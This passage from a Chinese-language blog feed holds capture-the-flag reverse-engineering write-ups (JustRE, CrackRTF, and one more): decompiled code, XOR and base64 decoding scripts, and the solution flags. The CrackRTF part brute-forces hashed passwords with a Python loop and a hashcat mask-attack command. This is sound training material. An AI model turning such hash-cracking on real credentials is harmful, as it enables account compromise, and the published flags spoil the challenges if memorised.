class="number">4294967294LL</span>;</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sub_410CC0(<span class="string">&quot;continue!&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(v18, <span class="number">0</span>, <span class="number">0x40</span>uLL);</span><br><span class="line">    v18[<span class="number">64</span>] = <span class="number">0</span>;</span><br><span class="line">    sub_4406E0(<span class="number">0LL</span>, v18, <span class="number">64LL</span>);</span><br><span class="line">    v18[<span class="number">39</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( sub_424BA0(v18) == <span class="number">39</span> )</span><br><span class="line">    <span class="comment">//v18é•¿åº¦åº”ä¸º39</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = sub_400E44(v18);</span><br><span class="line">      v3 = sub_400E44(v2);</span><br><span class="line">      v4 = sub_400E44(v3);</span><br><span class="line">      v5 = sub_400E44(v4);</span><br><span class="line">      v6 = sub_400E44(v5);</span><br><span class="line">      v7 = sub_400E44(v6);</span><br><span class="line">      v8 = sub_400E44(v7);</span><br><span class="line">      v9 = sub_400E44(v8);</span><br><span class="line">      v10 = sub_400E44(v9);</span><br><span class="line">      v11 = sub_400E44(v10);</span><br><span class="line">      <span class="comment">//è¿›åˆ°sub_400E44()é‡Œå¯ä»¥çœ‹åˆ°å®ƒç”¨äº†base64ç è¡¨,åº”è¯¥æ˜¯base64ç¼–ç å‡½æ•°</span></span><br><span class="line">      <span class="comment">//ä¸Šé¢å¯¹v18è¿›è¡Œäº†10æ¬¡base64ç¼–ç </span></span><br><span class="line">      <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)sub_400360(v11, off_6CC090) )</span><br><span class="line">      <span class="comment">//sub_400360()åº”è¯¥æ˜¯strcmp()</span></span><br><span class="line">      <span class="comment">//å¯¹æ¯”ç¼–ç 10æ¬¡åçš„å€¼æ˜¯å¦ä¸off_6CC090è¿™ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰</span></span><br><span class="line">      <span class="comment">//å°†off_6CC090è§£ç 10æ¬¡å°±å¯ä»¥å¾—åˆ°v18</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_410CC0(<span class="string">&quot;You found me!!!&quot;</span>);</span><br><span class="line">        sub_410CC0(<span class="string">&quot;bye bye~&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      result = <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = <span class="number">4294967293LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_13:</span><br><span class="line">  <span class="keyword">if</span> ( __readfsqword(<span class="number">0x28</span>u) != v19 )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°v15</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">string = <span class="string">&quot;Iodl&gt;Qnb(ocy\x7fy.i\x7fd`3w&#125;wek9&#123;iy=~yL@EC&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(string)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i ^ <span class="built_in">ord</span>(string[i])), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#Info:The first four chars are `flag`</span></span><br><span class="line"><span class="comment">#ä¸€ä¸ªæç¤º, ä½†æ˜¯ä¸çŸ¥é“å®ƒæŒ‡çš„å‰4ä¸ªå­—ç¬¦æ˜¯è°çš„å‰4ä¸ª</span></span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°v18</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Vm0wd2VHUXhTWGhpUm1SWVYwZDRWVll3Wkc5WFJsbDNXa1pPVlUxV2NIcFhhMk0\</span></span><br><span class="line"><span class="string">xVmpKS1NHVkdXbFpOYmtKVVZtcEtTMUl5VGtsaVJtUk9ZV3hhZVZadGVHdFRNVT\</span></span><br><span class="line"><span class="string">VYVW01T2FGSnRVbGhhVjNoaFZWWmtWMXBFVWxSTmJFcElWbTAxVDJGV1NuTlhia\</span></span><br><span class="line"><span class="string">0pXWWxob1dGUnJXbXRXTVZaeVdrWm9hVlpyV1hwV1IzaGhXVmRHVjFOdVVsWmlh\</span></span><br><span class="line"><span class="string">MHBZV1ZSR1lWZEdVbFZTYlhSWFRWWndNRlZ0TVc5VWJGcFZWbXR3VjJKSFVYZFd\</span></span><br><span class="line"><span class="string">ha1pXWlZaT2NtRkhhRk5pVjJoWVYxZDBhMVV3TlhOalJscFlZbGhTY1ZsclduZG\</span></span><br><span class="line"><span class="string">xiR1J5VmxSR1ZXSlZjRWhaTUZKaFZqSktWVkZZYUZkV1JWcFlWV3BHYTFkWFRrZ\</span></span><br><span class="line"><span class="string">FRiV3hvVFVoQ1dsWXhaRFJpTWtsM1RVaG9hbEpYYUhOVmJUVkRZekZhY1ZKcmRG\</span></span><br><span class="line"><span class="string">Tk5Wa3A2VjJ0U1ExWlhTbFpqUldoYVRVWndkbFpxUmtwbGJVWklZVVprYUdFeGN\</span></span><br><span class="line"><span class="string">HOVhXSEJIWkRGS2RGSnJhR2hTYXpWdlZGVm9RMlJzV25STldHUlZUVlpXTlZadE\</span></span><br><span class="line"><span class="string">5VOVdiVXBJVld4c1dtSllUWGhXTUZwell6RmFkRkpzVWxOaVNFSktWa1phVTFFe\</span></span><br><span class="line"><span class="string">FduUlRhMlJxVWxad1YxWnRlRXRXTVZaSFVsUnNVVlZVTURrPQ==</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">    string = base64.b64decode(string)</span><br><span class="line"><span class="built_in">print</span>(string.decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#https://bbs.pediy.com/thread-254172.htm</span></span><br><span class="line"><span class="comment">#æ€ä¹ˆæ˜¯ä¸ªç½‘ç«™????æˆ‘çš„flagå‘¢?!</span></span><br></pre></td></tr></table></figure>
<p>æ‰“å¼€ç½‘ç«™, å¾ˆå¥½, ä¸Šå½“äº†...</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128165228452.png"
alt="image-20220128165228452" />
<figcaption aria-hidden="true">image-20220128165228452</figcaption>
</figure>
<del>
æåˆ°è¿™é‡Œäº†å´å‘ç°æ˜¯ä¸ªå‡çš„, å¥½å°´å°¬ğŸ˜…
</del>
<p>çœ‹äº†åˆ«äººçš„WPæ‰çŸ¥é“ç­”æ¡ˆåŸæ¥ä»æˆ‘çœ¼å‰æºœè¿‡äº†</p>
<p><code>off_6CC090</code>è¿™ä¸ªå­—ç¬¦ä¸²é™„è¿‘æœ‰ç‚¹ä¸œè¥¿</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128230344597.png"
alt="image-20220128230344597" />
<figcaption aria-hidden="true">image-20220128230344597</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128230404288.png"
alt="image-20220128230404288" />
<figcaption aria-hidden="true">image-20220128230404288</figcaption>
</figure>
<p>äº¤å‰å¼•ç”¨æ‰¾è¿‡å»</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/image-20220128230447817.png"
alt="image-20220128230447817" />
<figcaption aria-hidden="true">image-20220128230447817</figcaption>
</figure>
<p>åˆ†æä¸€ä¸‹</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_400D35</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = sub_43FD20(<span class="number">0LL</span>) - qword_6CEE38;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1233</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_40F790(v1);</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    sub_40FE60();</span><br><span class="line">    v1 = sub_40FE60() ^ <span class="number">0x98765432</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//ä¸Šé¢è¿™ä¸€å¨ä¸æ˜¯å¾ˆæ‡‚</span></span><br><span class="line">  v4 = v1;</span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">unsigned</span> __int8)v1 ^ byte_6CC0A0[<span class="number">0</span>]) == <span class="number">102</span> &amp;&amp; (HIBYTE(v4) ^ (<span class="type">unsigned</span> __int8)byte_6CC0A3) == <span class="number">103</span> )</span><br><span class="line">  <span class="comment">//è¿™ä¸ªåˆ¤æ–­æ— å…³ç´§è¦,ç›´æ¥çœ‹ä¸‹é¢</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">24</span>; ++j )</span><br><span class="line">      sub_410E90((<span class="type">unsigned</span> __int8)(byte_6CC0A0[j] ^ *((_BYTE *)&amp;v4 + j % <span class="number">4</span>)));</span><br><span class="line">    <span class="comment">//å…³é”®ç‚¹åº”è¯¥å°±åœ¨è¿™é‡Œäº†,byte_6CC0A0è¿™ä¸ªå­—ç¬¦ä¸²çš„å†…å®¹å·²çŸ¥,å¼‚æˆ–çš„å¯†é’¥åªæœ‰4ä½,</span></span><br><span class="line">    <span class="comment">//ç»“åˆå‰é¢ç»™å‡ºçš„æç¤º,å‰é¢4ä½æ˜¯&quot;flag&quot;,æˆ‘ä»¬å°±å¯ä»¥å¾—å‡ºå¯†é’¥,ä»è€Œè§£å¯†å‡ºflag</span></span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    sub_444020();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§£å¯†ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">char</span> ciphertext[<span class="number">25</span>] =</span><br><span class="line">	&#123;</span><br><span class="line">	   <span class="number">64</span>,  <span class="number">53</span>,  <span class="number">32</span>,  <span class="number">86</span>,  <span class="number">93</span>,  <span class="number">24</span>,  <span class="number">34</span>,  <span class="number">69</span>,  <span class="number">23</span>,  <span class="number">47</span>,</span><br><span class="line">	   <span class="number">36</span>, <span class="number">110</span>,  <span class="number">98</span>,  <span class="number">60</span>,  <span class="number">39</span>,  <span class="number">84</span>,  <span class="number">72</span>, <span class="number">108</span>,  <span class="number">36</span>, <span class="number">110</span>,</span><br><span class="line">	  <span class="number">114</span>,  <span class="number">60</span>,  <span class="number">50</span>,  <span class="number">69</span>,  <span class="number">91</span></span><br><span class="line">	&#125;;</span><br><span class="line">	<span class="type">char</span> hint[<span class="number">4</span>] = &#123; <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;l&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;g&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">char</span> key[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">-128</span>; j &lt;= <span class="number">127</span>; j++)</span><br><span class="line">			<span class="keyword">if</span> ((ciphertext[i] ^ j) == hint[i])</span><br><span class="line">				key[i] = j;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++)</span><br><span class="line">		<span class="built_in">putchar</span>(ciphertext[i] ^ key[i % <span class="number">4</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//flag&#123;Act1ve_Defen5e_Test&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BJDCTF2020]JustRE</title>
    <url>/2022/01/23/%5BReverse%5DBJDCTF2020-JustRE/</url>
    <content><![CDATA[<p>æ— å£³, ä¸»å‡½æ•°å¤§éƒ¨åˆ†éƒ½æ˜¯<code>Windows</code>çš„<code>API</code>,
å…³é”®æ˜¯çœ‹è¿™ä¸ªå‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231416516.png"
alt="image-20220123141627396" />
<figcaption aria-hidden="true">image-20220123141627396</figcaption>
</figure>
<p>å†è·Ÿè¿›å»å¯ä»¥æ‰¾åˆ°å¦ä¸€ä¸ªå‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231417376.png"
alt="image-20220123141745338" />
<figcaption aria-hidden="true">image-20220123141745338</figcaption>
</figure>
<p>è¿˜æ˜¯æ²¡æœ‰å•¥æœ‰ä»·å€¼çš„ä¿¡æ¯, ä½†æ˜¯æ‰¾åˆ°äº†ç†Ÿæ‚‰çš„å‡½æ•°, åœ¨ä¹‹å‰å‡ºç°è¿‡, è§ <a
href="/2022/01/22/%5BReverse%5Dåˆ®å¼€æœ‰å¥–/">åˆ®å¼€æœ‰å¥–</a></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231420420.png"
alt="image-20220123142023366" />
<figcaption aria-hidden="true">image-20220123142023366</figcaption>
</figure>
<p>æœç„¶, ç­”æ¡ˆå°±åœ¨è¿™é‡Œäº†,
æ‰€ä»¥<strong>flag</strong>å°±æ˜¯<code>flag&#123;1999902069a45792d233ac&#125;</code></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231421934.png"
alt="image-20220123142111899" />
<figcaption aria-hidden="true">image-20220123142111899</figcaption>
</figure>
<p>è¿™é¢˜ä¹Ÿå¯ä»¥ä»å­—ç¬¦ä¸²ç›´æ¥å…¥æ‰‹, æ›´å¿«</p>
<blockquote>
<del>
è¿˜å¯ä»¥ç‚¹19999æ¬¡ç›´æ¥å‡ºflag
</del>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231422495.png"
alt="image-20220123142250428" />
<figcaption aria-hidden="true">image-20220123142250428</figcaption>
</figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>äºŒè¿›åˆ¶</tag>
        <tag>é€†å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]CrackRTF</title>
    <url>/2022/01/26/%5BReverse%5DCrackRTF/</url>
    <content><![CDATA[<p>æ— å£³, æ‹–è¿›<code>IDA</code>, F5æŸ¥çœ‹ä¼ªä»£ç </p>
<p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªå…³é”®å‡½æ•°</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261648536.png"
alt="image-20220126164811383" />
<figcaption aria-hidden="true">image-20220126164811383</figcaption>
</figure>
<p>ä¸¤ä¸ªå‡½æ•°ç»“æ„åŒºåˆ«ä¸å¤§,
é‡Œé¢è°ƒç”¨äº†å¾ˆå¤š<code>Widnwos</code>çš„<code>CryptoAPI</code></p>
<p>è¿™é‡Œä»¥<code>sub_40100A()</code>ä¸ºä¾‹,
é€šè¿‡å®ƒé—´æ¥è°ƒç”¨<code>sub_401230()</code></p>
<p>æŸ¥è¯¢å¾®è½¯æ–‡æ¡£,
<code>CryptCreateHash()</code>å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡æ˜ç®—æ³•ç±»å‹</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261654973.png"
alt="image-20220126165402916" />
<figcaption aria-hidden="true">image-20220126165402916</figcaption>
</figure>
<p>æŸ¥è¡¨å¯ä»¥å¾—çŸ¥è¿™ä¸ªå‡½æ•°æ˜¯è¿›è¡Œ<code>SHA-1</code>å“ˆå¸Œ</p>
<blockquote>
<p>å¾®è½¯æ–‡æ¡£: <a
href="https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id">MSDN</a></p>
</blockquote>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261708292.png"
alt="image-20220126170805262" />
<figcaption aria-hidden="true">image-20220126170805262</figcaption>
</figure>
<p>åŒç†å¯ä»¥å¾—çŸ¥<code>sub_401019()</code>æ˜¯è¿›è¡Œ<code>MD5</code>å“ˆå¸Œçš„å‡½æ•°</p>
<p>é€šè¿‡è¿™ä¸€æ®µå¯ä»¥å¾—çŸ¥ç¬¬ä¸€æ®µå¯†ç é•¿åº¦æ˜¯6ä½, ä¸”ä¸º6ä½æ•°å­—, å¯ä»¥ç›´æ¥ç©·ä¸¾</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">strlen</span>(Destination) != <span class="number">6</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Must be 6 characters!\n&quot;</span>);</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = atoi(Destination);</span><br><span class="line">  <span class="keyword">if</span> ( v7 &lt; <span class="number">100000</span> )</span><br><span class="line">    ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>ä»£ç å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100001</span>,<span class="number">1000000</span>):</span><br><span class="line">	hasher = hashlib.sha1()</span><br><span class="line">	hasher.update((<span class="built_in">str</span>(i)+<span class="string">&quot;@DBApp&quot;</span>).encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">	<span class="keyword">if</span> hasher.hexdigest().upper() == <span class="string">&quot;6E32D0943418C2C33385BC35A1470250DD8923A9&quot;</span>:</span><br><span class="line">		<span class="built_in">print</span>(i)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line"><span class="comment">#123321</span></span><br></pre></td></tr></table></figure>
<p>æ‰€ä»¥ç¬¬ä¸€æ®µå¯†ç å°±æ˜¯<code>123321</code></p>
<p>ç¬¬äºŒæ®µå¯†ç , åŒæ ·é•¿åº¦ä¸º6ä½, ä½†æ˜¯ç¬¬äºŒæ®µå¯†ç å¹¶æ²¡æœ‰é™åˆ¶æ˜¯çº¯æ•°å­—.</p>
<p>ç¬¬äºŒæ¬¡éªŒè¯çš„ç®—æ³•æ”¹æˆäº†<code>MD5</code>,
è¿›è¡Œå“ˆå¸Œçš„å†…å®¹å°±æ˜¯<code>ç¬¬äºŒæ®µå¯†ç +ç¬¬ä¸€æ®µå¯†ç +@DBApp</code>ç»„æˆçš„18å­—èŠ‚å­—ç¬¦.</p>
<h2 id="æ–¹æ³•ä¸€-çœŸæš´åŠ›ç ´è§£æ³•">æ–¹æ³•ä¸€: çœŸÂ·æš´åŠ›ç ´è§£æ³•</h2>
<p>æ‰€æœ‰<code>ASCII</code>å¯æ‰“å°å­—ç¬¦ä»<code>32~126</code>å…±95ä¸ª,
ç¬¬äºŒæ®µå¯†ç é•¿6ä½, é‚£ä¹ˆå¯èƒ½æ€§å°±æœ‰<span
class="math inline">\(95^6\)</span>ç§, å¤§çº¦7350äº¿ç§å¯èƒ½,
å†™è„šæœ¬ç©·ä¸¾å¥½åƒä¸å¤ªå¯èƒ½...ä½†æ˜¯,
æ˜¾å¡è¿›è¡Œ<code>MD5</code>å“ˆå¸Œçš„é€Ÿåº¦å¯æ˜¯ç›¸å½“å¿«çš„,
CPUåˆ™è¦æ…¢å¾—å¤šå¤šå¤šå¤šå¤š...</p>
<p>æ”¾å¼ <code>hashcat</code>çš„<code>benchmark</code>æ„Ÿå—ä¸€ä¸‹,
è¿™è¿˜åªæ˜¯ä¸ª3050Ti, æ¢åšé«˜ç«¯ä¸€ç‚¹çš„é‚£æ›´æ˜¯å¿«å¾—å¤š.<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261934019.png"
alt="image-20220126193440960" /></p>
<p>æ¢ç®—å‡ºæ¥å·®ä¸å¤šå°±æ˜¯164äº¿æ¬¡å“ˆå¸Œæ¯ç§’,
ç…§è¿™ä¸ªé€Ÿåº¦7350äº¿ç§å¯èƒ½ä¹Ÿä¸æ˜¯å¾ˆå¤š.</p>
<p>ç¡®å®šå¯è¡Œæ€§ä¹‹å, å°±å¯ä»¥ç”¨<code>hashcat</code>æ¥è¿›è¡Œç©·ä¸¾</p>
<blockquote>
<p>hashcat: <a href="https://github.com/hashcat/hashcat">Github</a></p>
</blockquote>
<p><strong>Nå¡</strong>å®‰è£…å¥½<code>CUDA</code>å¥—ä»¶ä¹‹å,
åœ¨<code>hashcat</code>ç›®å½•ä¸‹æ‰“å¼€å‘½ä»¤è¡Œæ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 27019e688a4e62a649fd99cadaafdb4e -m 0 ?a?a?a?a?a?a123321@DBApp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>-a 3 æŒ‡å®šæ”»å‡»æ–¹å¼, æ©ç æ”»å‡»</p>
<p>-m 0 æŒ‡å®šå“ˆå¸Œç±»å‹, MD5</p>
<p>?a?a?a?a?a?a123321@DBApp æ˜¯æ©ç , å‰é¢6ä½ä»£è¡¨æ‰€æœ‰å¯æ‰“å°ASCIIå­—ç¬¦</p>
</blockquote>
<p>å®é™…çš„å“ˆå¸Œé€Ÿåº¦è¦æ…¢ä¸€äº›, ä½†ä¾ç„¶æ˜¯æå¿«çš„, ä¸åˆ°åŠåˆ†é’Ÿå°±å®Œæˆäº†å·¥ä½œ</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201261953852.png"
alt="image-20220126195352794" />
<figcaption aria-hidden="true">image-20220126195352794</figcaption>
</figure>
<p>å¾—å‡ºç¬¬äºŒæ®µå¯†ç æ˜¯<code>~!3a@0</code></p>
<h2 id="æ–¹æ³•äºŒ-å¸¸è§„æ–¹æ³•">æ–¹æ³•äºŒ: å¸¸è§„æ–¹æ³•</h2>
<p>è€å®è¯´æˆ‘æ˜¯ä¸Šæ¥å°±è€ƒè™‘ç”¨<code>hashcat</code>å°è¯•ç©·ä¸¾çš„, æ²¡æƒ³åˆ°è¿˜æœ‰æ–¹æ³•,
çœ‹äº†åˆ«äººçš„WPæ‰çŸ¥é“.</p>
<p>å…³é”®ç‚¹åœ¨è¿™ä¸ªå‡½æ•°<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201262038770.png"
alt="image-20220126203837733" /></p>
<p>è·Ÿè¿›å»æ‰¾åˆ°<code>sub_4014D0()</code>è¿™ä¸ªå‡½æ•°,
<code>Windows</code>çš„<code>API</code>æœ‰ç‚¹å¤š,
ç»“åˆå¾®è½¯çš„æ–‡æ¡£åˆ†æå…¶ç”¨æ„</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> __cdecl <span class="title function_">sub_4014D0</span><span class="params">(LPCSTR lpString)</span></span><br><span class="line">&#123;</span><br><span class="line">  LPCVOID lpBuffer; <span class="comment">// [esp+50h] [ebp-1Ch]</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [esp+58h] [ebp-14h] BYREF</span></span><br><span class="line">  DWORD nNumberOfBytesToWrite; <span class="comment">// [esp+5Ch] [ebp-10h]</span></span><br><span class="line">  HGLOBAL hResData; <span class="comment">// [esp+60h] [ebp-Ch]</span></span><br><span class="line">  HRSRC hResInfo; <span class="comment">// [esp+64h] [ebp-8h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [esp+68h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  hFile = <span class="number">0</span>;</span><br><span class="line">  hResData = <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = <span class="number">0</span>;</span><br><span class="line">  NumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">  hResInfo = FindResourceA(<span class="number">0</span>, (LPCSTR)<span class="number">0x65</span>, <span class="string">&quot;AAA&quot;</span>);</span><br><span class="line">  <span class="comment">//ä»è½½å…¥ä¸ºå½“å‰è¿›ç¨‹çš„PEæ–‡ä»¶,æ‰¾åˆ°ä¸€ä¸ªåä¸º&quot;e&quot;(0x65)ä¸”èµ„æºç±»å‹ä¸º&quot;AAA&quot;çš„èµ„æº</span></span><br><span class="line">  <span class="keyword">if</span> ( !hResInfo )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  nNumberOfBytesToWrite = SizeofResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="comment">//è®¡ç®—èµ„æºå¤§å°</span></span><br><span class="line">  hResData = LoadResource(<span class="number">0</span>, hResInfo);</span><br><span class="line">  <span class="comment">//è½½å…¥èµ„æº</span></span><br><span class="line">  <span class="keyword">if</span> ( !hResData )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  lpBuffer = LockResource(hResData);</span><br><span class="line">  <span class="comment">//é”å®šèµ„æº,è¿”å›èµ„æºåœ¨å†…å­˜ä¸­çš„æŒ‡é’ˆ</span></span><br><span class="line">  sub_401005(lpString, (<span class="type">int</span>)lpBuffer, nNumberOfBytesToWrite);</span><br><span class="line">  <span class="comment">//ä¸‹ä¸€ä¸ªå…³æ³¨ç‚¹,æ­¤å‡½æ•°å¤„ç†èµ„æº,å¯¹å…¶è¿›è¡Œå¼‚æˆ–è§£å¯†</span></span><br><span class="line">  hFile = CreateFileA(<span class="string">&quot;dbapp.rtf&quot;</span>, <span class="number">0x10000000</span>u, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2u</span>, <span class="number">0x80</span>u, <span class="number">0</span>);</span><br><span class="line">  <span class="comment">//åˆ›å»ºåä¸º&quot;dbapp.rtf&quot;çš„æ–‡ä»¶,å‚¨å­˜è§£å¯†åçš„rtfæ ¼å¼flagæ–‡ä»¶</span></span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, &amp;NumberOfBytesWritten, <span class="number">0</span>) )</span><br><span class="line">    <span class="comment">//å°†è§£å¯†åçš„èµ„æºå†™å…¥åˆ°æ–‡ä»¶ä¸­</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  CloseHandle(hFile);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_401005()</code>è°ƒç”¨äº†<code>sub_401420()</code>,
æ¥ç€åˆ†æ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> __cdecl <span class="title function_">sub_401420</span><span class="params">(LPCSTR lpString, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v5 = lstrlenA(lpString);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> 